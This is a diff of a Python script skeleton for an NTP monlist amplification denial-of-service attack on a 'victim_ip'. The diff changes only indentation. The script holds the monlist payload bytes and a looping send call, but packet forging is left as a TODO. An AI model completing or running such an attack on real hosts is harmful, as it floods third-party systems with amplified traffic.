@@ -9,16 +9,16 @@ def usage():
 
 
 def startAttack(victim_ip, ntp_server_ip):
-    # NTP monlist packet payload
-    data = "\x17\x00\x03\x2a" + "\x00" * 4 * 11
+	# NTP monlist packet payload
+	data = "\x17\x00\x03\x2a" + "\x00" * 4 * 11
 
 	print(f"Attacking {victim_ip} whith {ntp_server_ip} as NTP server")
 
-    # TODO: forge packet
-    #packet =
+	# TODO: forge packet
+	#packet =
 
-    # send packet
-    send(packet, loop=0)
+	# send packet
+	send(packet, loop=0)
 
 	print(f"Attack finished.")
 
